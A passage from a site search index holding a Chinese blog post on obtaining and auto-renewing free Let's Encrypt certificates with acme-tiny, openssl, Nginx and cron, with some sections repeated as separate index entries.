\u9996\u5148\u521b\u5efa\u7528\u4e8e\u5b58\u653e\u9a8c\u8bc1\u6587\u4ef6\u7684\u76ee\u5f55\uff0c\u4f8b\u5982\uff1a mkdir ~/www/challenges/ \u7136\u540e\u914d\u7f6e\u4e00\u4e2a HTTP \u670d\u52a1\uff0c\u4ee5 Nginx \u4e3a\u4f8b\uff1a server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } } \u4ee5\u4e0a\u914d\u7f6e\u4f18\u5148\u67e5\u627e ~/www/challenges/ \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5c31\u91cd\u5b9a\u5411\u5230 HTTPS \u5730\u5740\u3002\u8fd9\u4e2a\u9a8c\u8bc1\u670d\u52a1\u4ee5\u540e\u66f4\u65b0\u8bc1\u4e66\u8fd8\u8981\u7528\u5230\uff0c\u5efa\u8bae\u4e00\u76f4\u4fdd\u7559\u3002 \u83b7\u53d6\u7f51\u7ad9\u8bc1\u4e66 \u5148\u628a acme-tiny \u811a\u672c\u4fdd\u5b58\u5230\u4e4b\u524d\u7684 ssl \u76ee\u5f55\uff1a wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py \u6307\u5b9a\u8d26\u6237\u79c1\u94a5\u3001CSR \u4ee5\u53ca\u9a8c\u8bc1\u76ee\u5f55\uff0c\u6267\u884c\u811a\u672c\uff1a python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir ~/www/challenges/ > ./signed.crt \u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u5f53\u524d\u76ee\u5f55\u4e0b\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a signed.crt \uff0c\u8fd9\u5c31\u662f\u7533\u8bf7\u597d\u7684\u8bc1\u4e66\u6587\u4ef6\u3002 \u5982\u679c\u4f60\u628a\u57df\u540d DNS \u89e3\u6790\u653e\u5728\u56fd\u5185\uff0c\u8fd9\u4e00\u6b65\u5f88\u53ef\u80fd\u4f1a\u9047\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u9519\u8bef\uff1a ValueError: Wrote file to /home/xxx/www/challenges/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg \u8fd9\u662f\u56e0\u4e3a\u4f60\u7684\u57df\u540d\u5f88\u53ef\u80fd\u5728\u56fd\u5916\u65e0\u6cd5\u89e3\u6790\uff0c\u53ef\u4ee5\u627e\u53f0\u56fd\u5916 VPS \u9a8c\u8bc1\u4e0b\u3002\u6211\u7684\u57df\u540d\u6700\u8fd1\u4ece DNSPod \u6362\u5230\u4e86\u963f\u91cc\u4e91\u89e3\u6790\uff0c\u6700\u540e\u53c8\u6362\u5230\u4e86 CloudXNS\uff0c\u5c31\u662f\u56e0\u4e3a\u6700\u8fd1\u524d\u4e24\u5bb6\u5728\u56fd\u5916\u90fd\u5f88\u4e0d\u7a33\u5b9a\u3002\u5982\u679c\u4f60\u4e5f\u9047\u5230\u4e86\u7c7b\u4f3c\u60c5\u51b5\uff0c\u53ef\u4ee5\u6682\u65f6\u4f7f\u7528\u56fd\u5916\u7684 DNS \u89e3\u6790\u670d\u52a1\u5546\uff0c\u4f8b\u5982 dns.he.net \u3002\u5982\u679c\u8fd8\u662f\u641e\u4e0d\u5b9a\uff0c\u4e5f\u53ef\u4ee5\u8bd5\u8bd5\u300c Neilpang/le \u300d\u8fd9\u4e2a\u5de5\u5177\u7684 DNS Mode\u3002 \u641e\u5b9a\u7f51\u7ad9\u8bc1\u4e66\u540e\uff0c\u8fd8\u8981\u4e0b\u8f7d Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\u3002\u6211\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u8bb2\u8fc7\uff0c\u914d\u7f6e HTTPS \u8bc1\u4e66\u65f6\u65e2\u4e0d\u8981\u6f0f\u6389\u4e2d\u95f4\u8bc1\u4e66\uff0c\u4e5f\u4e0d\u8981\u5305\u542b\u6839\u8bc1\u4e66\u3002\u5728 Nginx \u914d\u7f6e\u4e2d\uff0c\u9700\u8981\u628a\u4e2d\u95f4\u8bc1\u4e66\u548c\u7f51\u7ad9\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem \u4e3a\u4e86\u540e\u7eed\u80fd\u987a\u5229\u542f\u7528 OCSP Stapling \uff0c\u6211\u4eec\u518d\u628a\u6839\u8bc1\u4e66\u548c\u4e2d\u95f4\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/isrgrootx1.pem > root.pem cat intermediate.pem root.pem > full_chained.pem \u6700\u7ec8\uff0c\u4fee\u6539 Nginx \u4e2d\u6709\u5173\u8bc1\u4e66\u7684\u914d\u7f6e\u5e76 reload \u670d\u52a1\u5373\u53ef\uff1a ssl_certificate ~/www/ssl/chained.pem; ssl_certificate_key ~/www/ssl/domain.key; Nginx \u4e2d\u4e0e HTTPS \u6709\u5173\u7684\u914d\u7f6e\u9879\u5f88\u591a\uff0c\u8fd9\u91cc\u4e0d\u4e00\u4e00\u5217\u4e3e\u4e86\u3002\u5982\u6709\u9700\u8981\uff0c \u8bf7\u53c2\u8003\u672c\u7ad9\u914d\u7f6e \u3002 \u914d\u7f6e\u81ea\u52a8\u66f4\u65b0 Let's Encrypt \u7b7e\u53d1\u7684\u8bc1\u4e66\u53ea\u6709 90 \u5929\u6709\u6548\u671f\uff0c\u63a8\u8350\u4f7f\u7528\u811a\u672c\u5b9a\u671f\u66f4\u65b0\u3002\u4f8b\u5982\u6211\u5c31\u521b\u5efa\u4e86\u4e00\u4e2a renew_cert.sh \u5e76\u901a\u8fc7 chmod a+x renew_cert.sh \u8d4b\u4e88\u6267\u884c\u6743\u9650\u3002\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a #!/bin/bash cd /home/xxx/www/ssl/ python acme_tiny.py --account-key account.key --csr domain.csr --acme-dir /home/xxx/www/challenges/ > signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem service nginx reload crontab \u4e2d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u6bd4\u8f83\u4fdd\u9669\uff0c crontab -e \u52a0\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a 0 0 1 * * /home/xxx/shell/renew_cert.sh >/dev/null 2>&1 \u8fd9\u6837\u4ee5\u540e\u8bc1\u4e66\u6bcf\u4e2a\u6708\u90fd\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u4e00\u52b3\u6c38\u9038\u3002\u5b9e\u9645\u4e0a\uff0cLet's Encrypt \u5b98\u65b9\u5c06\u8bc1\u4e66\u6709\u6548\u671f\u5b9a\u4e3a 90 \u5929\u4e00\u65b9\u9762\u662f\u4e3a\u4e86\u66f4\u5b89\u5168\uff0c\u66f4\u91cd\u8981\u7684\u662f\u9f13\u52b1\u7528\u6237\u91c7\u7528\u81ea\u52a8\u5316\u90e8\u7f72\u65b9\u6848\u3002 \u51e0\u4e2a\u95ee\u9898 Let's Encrypt \u8bc1\u4e66\u7684\u517c\u5bb9\u6027\uff0c\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u9ed8\u8ba4\u662f\u5426\u90fd\u80fd\u8bc6\u522b\u662f\u5927\u5bb6\u6700\u5173\u5fc3\u7684\u95ee\u9898\u3002\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e Let's Encrypt \u4e0e IdenTrust \u7684 DST Root CA \u505a\u4e86\u4ea4\u53c9\u8ba4\u8bc1\uff0c\u517c\u5bb9\u6027\u8fd8\u662f\u4e0d\u9519\u7684\uff0c\u76ee\u524d\u6211\u53ea\u662f\u53d1\u73b0\u5728 Android 2 \u548c Windows XP \u4e0b\u6709\u95ee\u9898\uff08Firefox \u7684\u8bc1\u4e66\u90a3\u4e00\u5957\u662f\u81ea\u5df1\u5b9e\u73b0\u7684\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u7cfb\u7edf\uff0cXP \u4e0b\u53ea\u6709 Firefox \u4fe1\u4efb Let's Encrypt \u8bc1\u4e66\uff09\uff0c\u5176\u5b83\u73af\u5883\u90fd\u6b63\u5e38\u3002 \uff08Windows XP \u4e0d\u4fe1\u4efb Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\uff09 \u66f4\u65b0\uff1a\u6839\u636e Let's Encrypt \u5b98\u65b9\u8bf4\u660e\uff0cWindows XP \u4e0b\u7684\u95ee\u9898\u5f88\u5feb\u5c31\u4f1a\u89e3\u51b3\uff1a A bug in Windows XP causes parsing of our current cross-signature from IdenTrust to fail. We will be correcting this by getting new cross-signatures from IdenTrust which work on Windows XP. \u6ce8\uff1a\u5df2\u4e8e 2016 \u5e74 3 \u6708 26 \u65e5\u89e3\u51b3\u3002 \u53e6\u5916\u4e00\u4e2a\u95ee\u9898\u6709\u5173 ECC \u8bc1\u4e66\uff0c\u5b98\u7f51\u8868\u793a\u8ba1\u5212\u5c06\u5728 2016 \u5e74\u63d0\u4f9b\u5bf9 ECC \u8bc1\u4e66\u7684\u652f\u6301\uff1a Right now all of our root and intermediate keys use RSA. We're planning to generate ECC keys and make an ECC option available to subscribers in 2016. via \u6ce8\uff1aLet's Encrypt \u5df2\u4e8e 2016 \u5e74 2 \u6708 11 \u65e5\u5f00\u59cb\u652f\u6301\u7b7e\u53d1 ECC \u8bc1\u4e66\u3002 Let's Encrypt \u5b98\u65b9\u7684\u65b0\u7279\u6027\u9884\u544a\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u9875\u9762\u67e5\u770b \u3002 \u6211\u4e2a\u4eba\u5efa\u8bae\uff1a\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u5982\u679c\u975e\u5e38\u5728\u610f\u8bc1\u4e66\u517c\u5bb9\u6027\uff0c\u53ef\u4ee5\u8d2d\u4e70 RapidSSL Standard \u6216\u8005 Comodo Positive SSL \u8fd9\u4e24\u79cd\u8bc1\u4e66\u3002\u5176\u4e2d RapidSSL \u8bc1\u4e66\u4e00\u5171\u624d\u4e09\u7ea7\uff0c\u6bd4\u8f83\u5c0f\uff1bComodo Positive \u6709\u56db\u7ea7\uff0c\u4f46\u53ef\u4ee5\u7533\u8bf7 ECC \u8bc1\u4e66\uff1b\u4e8c\u8005\u90fd\u6709\u7740\u4e0d\u9519\u7684\u517c\u5bb9\u6027\uff0c\u4e5f\u975e\u5e38\u5ec9\u4ef7\uff08\u4e00\u5e74\u4e0d\u5230 10$\uff09\u3002\u5f53\u7136\uff0c\u5982\u679c\u4e0d\u7528\u8003\u8651 Windows XP \u7528\u6237\uff0c\u90a3\u4e48\u5f3a\u70c8\u63a8\u8350 Let's Encrypt\uff01 \u66f4\u65b0\uff1aLet's Encrypt \u5df2\u7ecf\u652f\u6301 Windows XP \u548c\u7b7e\u53d1 ECC \u8bc1\u4e66\uff0c\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u76ee\u524d Let's Encrypt \u65e0\u7591\u662f\u6700\u597d\u7684\u9009\u62e9\u3002 \u672c\u6587\u5148\u5199\u5230\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u5728\u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u7684\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\uff0c\u53ef\u4ee5\u7ed9\u6211\u7559\u8a00\uff0c\u4e5f\u6b22\u8fce\u4ea4\u6d41\u5404\u79cd\u5fc3\u5f97\uff01 \u672c\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html \uff0c \u53c2\u4e0e\u8bc4\u8bba \u00bb --EOF-- \u539f\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html","title":"Let's Encrypt\uff0c\u514d\u8d39\u597d\u7528\u7684 HTTPS \u8bc1\u4e66"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#lets-encrypt-https","text":"============================ \u5f88\u65e9\u4e4b\u524d\u6211\u5c31\u5728\u5173\u6ce8 Let's Encrypt \u8fd9\u4e2a\u514d\u8d39\u3001\u81ea\u52a8\u5316\u3001\u5f00\u653e\u7684\u8bc1\u4e66\u7b7e\u53d1\u670d\u52a1\u3002\u5b83\u7531 ISRG\uff08Internet Security Research Group\uff0c\u4e92\u8054\u7f51\u5b89\u5168\u7814\u7a76\u5c0f\u7ec4\uff09\u63d0\u4f9b\u670d\u52a1\uff0c\u800c ISRG \u662f\u6765\u81ea\u4e8e\u7f8e\u56fd\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u7684\u4e00\u4e2a\u516c\u76ca\u7ec4\u7ec7\u3002Let's Encrypt \u5f97\u5230\u4e86 Mozilla\u3001Cisco\u3001Akamai\u3001Electronic Frontier Foundation \u548c Chrome \u7b49\u4f17\u591a\u516c\u53f8\u548c\u673a\u6784\u7684\u652f\u6301\uff0c\u53d1\u5c55\u5341\u5206\u8fc5\u731b\u3002 \u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u4e0d\u4f46\u514d\u8d39\uff0c\u8fd8\u975e\u5e38\u7b80\u5355\uff0c\u867d\u7136\u6bcf\u6b21\u53ea\u6709 90 \u5929\u7684\u6709\u6548\u671f\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u5b9a\u671f\u66f4\u65b0\uff0c\u914d\u597d\u4e4b\u540e\u4e00\u52b3\u6c38\u9038\u3002\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u89c2\u671b\uff0c\u6211\u4e5f\u6b63\u5f0f\u542f\u7528 Let's Encrypt \u8bc1\u4e66\u4e86\uff0c\u672c\u6587\u8bb0\u5f55\u672c\u7ad9\u7533\u8bf7\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u3002 \u6211\u6ca1\u6709\u4f7f\u7528 Let's Encrypt \u5b98\u7f51\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u7533\u8bf7\u8bc1\u4e66\uff0c\u800c\u662f\u7528\u4e86 acme-tiny \u8fd9\u4e2a\u66f4\u4e3a\u5c0f\u5de7\u7684\u5f00\u6e90\u5de5\u5177\u3002\u4ee5\u4e0b\u5185\u5bb9\u57fa\u672c\u6309\u7167 acme-tiny \u7684\u8bf4\u660e\u6587\u6863\u5199\u7684\uff0c\u7701\u7565\u4e86\u4e00\u4e9b\u6211\u4e0d\u9700\u8981\u7684\u6b65\u9aa4\u3002 ACME \u5168\u79f0\u662f Automated Certificate Management Environment\uff0c\u76f4\u8bd1\u8fc7\u6765\u662f\u81ea\u52a8\u5316\u8bc1\u4e66\u7ba1\u7406\u73af\u5883\u7684\u610f\u601d\uff0cLet's Encrypt \u7684\u8bc1\u4e66\u7b7e\u53d1\u8fc7\u7a0b\u4f7f\u7528\u7684\u5c31\u662f ACME \u534f\u8bae\u3002\u6709\u5173 ACME \u534f\u8bae\u7684\u66f4\u591a\u8d44\u6599\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u4ed3\u5e93 \u627e\u5230\u3002","title":"Let's Encrypt\uff0c\u514d\u8d39\u597d\u7528\u7684 HTTPS \u8bc1\u4e66"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_1","text":"\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\uff0c\u4f8b\u5982 ssl \uff0c\u7528\u6765\u5b58\u653e\u5404\u79cd\u4e34\u65f6\u6587\u4ef6\u548c\u6700\u540e\u7684\u8bc1\u4e66\u6587\u4ef6\u3002\u8fdb\u5165\u8fd9\u4e2a\u76ee\u5f55\uff0c\u521b\u5efa\u4e00\u4e2a RSA \u79c1\u94a5\u7528\u4e8e Let's Encrypt \u8bc6\u522b\u4f60\u7684\u8eab\u4efd\uff1a openssl genrsa 4096 > account.key","title":"\u521b\u5efa\u5e10\u53f7"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#csr","text":"\u63a5\u7740\u5c31\u53ef\u4ee5\u751f\u6210 CSR\uff08Certificate Signing Request\uff0c\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42\uff09\u6587\u4ef6\u4e86\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u8fd8\u9700\u8981\u521b\u5efa\u57df\u540d\u79c1\u94a5\uff08\u4e00\u5b9a\u4e0d\u8981\u4f7f\u7528\u4e0a\u9762\u7684\u8d26\u6237\u79c1\u94a5\uff09\uff0c\u6839\u636e\u8bc1\u4e66\u4e0d\u540c\u7c7b\u578b\uff0c\u57df\u540d\u79c1\u94a5\u4e5f\u53ef\u4ee5\u9009\u62e9 RSA \u548c ECC \u4e24\u79cd\u4e0d\u540c\u7c7b\u578b\u3002\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u4e8c\u9009\u4e00\u3002 1\uff09\u521b\u5efa RSA \u79c1\u94a5\uff08\u517c\u5bb9\u6027\u597d\uff09\uff1a openssl genrsa 4096 > domain.key 2\uff09\u521b\u5efa ECC \u79c1\u94a5\uff08\u90e8\u5206\u8001\u65e7\u64cd\u4f5c\u7cfb\u7edf\u3001\u6d4f\u89c8\u5668\u4e0d\u652f\u6301\u3002\u4f18\u70b9\u662f\u8bc1\u4e66\u4f53\u79ef\u5c0f\uff09\uff1a #secp256r1 openssl ecparam -genkey -name secp256r1 | openssl ec -out domain.key #secp384r1 openssl ecparam -genkey -name secp384r1 | openssl ec -out domain.key \u6709\u5173 ECC \u8bc1\u4e66\u7684\u66f4\u591a\u4ecb\u7ecd\uff0c\u8bf7 \u70b9\u51fb\u8fd9\u91cc \u3002 \u6709\u4e86\u79c1\u94a5\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u751f\u6210 CSR \u6587\u4ef6\u4e86\u3002\u5728 CSR \u4e2d\u63a8\u8350\u81f3\u5c11\u628a\u57df\u540d\u5e26 www \u548c\u4e0d\u5e26 www \u7684\u4e24\u79cd\u60c5\u51b5\u90fd\u52a0\u8fdb\u53bb\uff0c\u5176\u5b83\u5b50\u57df\u53ef\u4ee5\u6839\u636e\u9700\u8981\u6dfb\u52a0\uff08\u76ee\u524d\u4e00\u5f20\u8bc1\u4e66\u6700\u591a\u53ef\u4ee5\u5305\u542b 100 \u4e2a\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) > domain.csr \u6267\u884c\u8fd9\u4e00\u6b65\u65f6\uff0c\u5982\u679c\u63d0\u793a\u627e\u4e0d\u5230 /etc/ssl/openssl.cnf \u6587\u4ef6\uff0c\u8bf7\u770b\u770b /usr/local/openssl/ssl/openssl.cnf \u662f\u5426\u5b58\u5728\u3002\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4ea4\u4e92\u65b9\u5f0f\u521b\u5efa CSR\uff08\u9700\u8981\u6ce8\u610f Common Name \u5fc5\u987b\u4e3a\u4f60\u7684\u57df\u540d\uff09\uff1a openssl req -new -sha256 -key domain.key -out domain.csr","title":"\u521b\u5efa CSR \u6587\u4ef6"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_2","text":"\u6211\u4eec\u77e5\u9053\uff0cCA \u5728\u7b7e\u53d1 DV\uff08Domain Validation\uff09\u8bc1\u4e66\u65f6\uff0c\u9700\u8981\u9a8c\u8bc1\u57df\u540d\u6240\u6709\u6743\u3002\u4f20\u7edf CA \u7684\u9a8c\u8bc1\u65b9\u5f0f\u4e00\u822c\u662f\u5f80 admin@yoursite.com \u53d1\u9a8c\u8bc1\u90ae\u4ef6\uff0c\u800c Let's Encrypt \u662f\u5728\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u751f\u6210\u4e00\u4e2a\u968f\u673a\u9a8c\u8bc1\u6587\u4ef6\uff0c\u518d\u901a\u8fc7\u521b\u5efa CSR \u65f6\u6307\u5b9a\u7684\u57df\u540d\u8bbf\u95ee\uff0c\u5982\u679c\u53ef\u4ee5\u8bbf\u95ee\u5219\u8868\u660e\u4f60\u5bf9\u8fd9\u4e2a\u57df\u540d\u6709\u63a7\u5236\u6743\u3002 \u9996\u5148\u521b\u5efa\u7528\u4e8e\u5b58\u653e\u9a8c\u8bc1\u6587\u4ef6\u7684\u76ee\u5f55\uff0c\u4f8b\u5982\uff1a mkdir ~/www/challenges/ \u7136\u540e\u914d\u7f6e\u4e00\u4e2a HTTP \u670d\u52a1\uff0c\u4ee5 Nginx \u4e3a\u4f8b\uff1a server { server_name www.yoursite.com yoursite.com; location ^~ /.well-known/acme-challenge/ { alias /home/xxx/www/challenges/; try_files $uri =404; } location / { rewrite ^/(.*)$ https://yoursite.com/$1 permanent; } } \u4ee5\u4e0a\u914d\u7f6e\u4f18\u5148\u67e5\u627e ~/www/challenges/ \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5c31\u91cd\u5b9a\u5411\u5230 HTTPS \u5730\u5740\u3002\u8fd9\u4e2a\u9a8c\u8bc1\u670d\u52a1\u4ee5\u540e\u66f4\u65b0\u8bc1\u4e66\u8fd8\u8981\u7528\u5230\uff0c\u5efa\u8bae\u4e00\u76f4\u4fdd\u7559\u3002","title":"\u914d\u7f6e\u9a8c\u8bc1\u670d\u52a1"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_3","text":"\u5148\u628a acme-tiny \u811a\u672c\u4fdd\u5b58\u5230\u4e4b\u524d\u7684 ssl \u76ee\u5f55\uff1a wget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py \u6307\u5b9a\u8d26\u6237\u79c1\u94a5\u3001CSR \u4ee5\u53ca\u9a8c\u8bc1\u76ee\u5f55\uff0c\u6267\u884c\u811a\u672c\uff1a python acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir ~/www/challenges/ > ./signed.crt \u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u5f53\u524d\u76ee\u5f55\u4e0b\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a signed.crt \uff0c\u8fd9\u5c31\u662f\u7533\u8bf7\u597d\u7684\u8bc1\u4e66\u6587\u4ef6\u3002 \u5982\u679c\u4f60\u628a\u57df\u540d DNS \u89e3\u6790\u653e\u5728\u56fd\u5185\uff0c\u8fd9\u4e00\u6b65\u5f88\u53ef\u80fd\u4f1a\u9047\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u9519\u8bef\uff1a ValueError: Wrote file to /home/xxx/www/challenges/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/oJbvpIhkwkBGBAQUklWJXyC8VbWAdQqlgpwUJkgC1Vg \u8fd9\u662f\u56e0\u4e3a\u4f60\u7684\u57df\u540d\u5f88\u53ef\u80fd\u5728\u56fd\u5916\u65e0\u6cd5\u89e3\u6790\uff0c\u53ef\u4ee5\u627e\u53f0\u56fd\u5916 VPS \u9a8c\u8bc1\u4e0b\u3002\u6211\u7684\u57df\u540d\u6700\u8fd1\u4ece DNSPod \u6362\u5230\u4e86\u963f\u91cc\u4e91\u89e3\u6790\uff0c\u6700\u540e\u53c8\u6362\u5230\u4e86 CloudXNS\uff0c\u5c31\u662f\u56e0\u4e3a\u6700\u8fd1\u524d\u4e24\u5bb6\u5728\u56fd\u5916\u90fd\u5f88\u4e0d\u7a33\u5b9a\u3002\u5982\u679c\u4f60\u4e5f\u9047\u5230\u4e86\u7c7b\u4f3c\u60c5\u51b5\uff0c\u53ef\u4ee5\u6682\u65f6\u4f7f\u7528\u56fd\u5916\u7684 DNS \u89e3\u6790\u670d\u52a1\u5546\uff0c\u4f8b\u5982 dns.he.net \u3002\u5982\u679c\u8fd8\u662f\u641e\u4e0d\u5b9a\uff0c\u4e5f\u53ef\u4ee5\u8bd5\u8bd5\u300c Neilpang/le \u300d\u8fd9\u4e2a\u5de5\u5177\u7684 DNS Mode\u3002 \u641e\u5b9a\u7f51\u7ad9\u8bc1\u4e66\u540e\uff0c\u8fd8\u8981\u4e0b\u8f7d Let's Encrypt \u7684\u4e2d\u95f4\u8bc1\u4e66\u3002\u6211\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\u8bb2\u8fc7\uff0c\u914d\u7f6e HTTPS \u8bc1\u4e66\u65f6\u65e2\u4e0d\u8981\u6f0f\u6389\u4e2d\u95f4\u8bc1\u4e66\uff0c\u4e5f\u4e0d\u8981\u5305\u542b\u6839\u8bc1\u4e66\u3002\u5728 Nginx \u914d\u7f6e\u4e2d\uff0c\u9700\u8981\u628a\u4e2d\u95f4\u8bc1\u4e66\u548c\u7f51\u7ad9\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem \u4e3a\u4e86\u540e\u7eed\u80fd\u987a\u5229\u542f\u7528 OCSP Stapling \uff0c\u6211\u4eec\u518d\u628a\u6839\u8bc1\u4e66\u548c\u4e2d\u95f4\u8bc1\u4e66\u5408\u5728\u4e00\u8d77\uff1a wget -O - https://letsencrypt.org/certs/isrgrootx1.pem > root.pem cat intermediate.pem root.pem > full_chained.pem \u6700\u7ec8\uff0c\u4fee\u6539 Nginx \u4e2d\u6709\u5173\u8bc1\u4e66\u7684\u914d\u7f6e\u5e76 reload \u670d\u52a1\u5373\u53ef\uff1a ssl_certificate ~/www/ssl/chained.pem; ssl_certificate_key ~/www/ssl/domain.key; Nginx \u4e2d\u4e0e HTTPS \u6709\u5173\u7684\u914d\u7f6e\u9879\u5f88\u591a\uff0c\u8fd9\u91cc\u4e0d\u4e00\u4e00\u5217\u4e3e\u4e86\u3002\u5982\u6709\u9700\u8981\uff0c \u8bf7\u53c2\u8003\u672c\u7ad9\u914d\u7f6e \u3002","title":"\u83b7\u53d6\u7f51\u7ad9\u8bc1\u4e66"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_4","text":"Let's Encrypt \u7b7e\u53d1\u7684\u8bc1\u4e66\u53ea\u6709 90 \u5929\u6709\u6548\u671f\uff0c\u63a8\u8350\u4f7f\u7528\u811a\u672c\u5b9a\u671f\u66f4\u65b0\u3002\u4f8b\u5982\u6211\u5c31\u521b\u5efa\u4e86\u4e00\u4e2a renew_cert.sh \u5e76\u901a\u8fc7 chmod a+x renew_cert.sh \u8d4b\u4e88\u6267\u884c\u6743\u9650\u3002\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a #!/bin/bash cd /home/xxx/www/ssl/ python acme_tiny.py --account-key account.key --csr domain.csr --acme-dir /home/xxx/www/challenges/ > signed.crt || exit wget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem cat signed.crt intermediate.pem > chained.pem service nginx reload crontab \u4e2d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u6bd4\u8f83\u4fdd\u9669\uff0c crontab -e \u52a0\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a 0 0 1 * * /home/xxx/shell/renew_cert.sh >/dev/null 2>&1 \u8fd9\u6837\u4ee5\u540e\u8bc1\u4e66\u6bcf\u4e2a\u6708\u90fd\u4f1a\u81ea\u52a8\u66f4\u65b0\uff0c\u4e00\u52b3\u6c38\u9038\u3002\u5b9e\u9645\u4e0a\uff0cLet's Encrypt \u5b98\u65b9\u5c06\u8bc1\u4e66\u6709\u6548\u671f\u5b9a\u4e3a 90 \u5929\u4e00\u65b9\u9762\u662f\u4e3a\u4e86\u66f4\u5b89\u5168\uff0c\u66f4\u91cd\u8981\u7684\u662f\u9f13\u52b1\u7528\u6237\u91c7\u7528\u81ea\u52a8\u5316\u90e8\u7f72\u65b9\u6848\u3002","title":"\u914d\u7f6e\u81ea\u52a8\u66f4\u65b0"},{"location":"RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/#_5","text":"Let's Encrypt 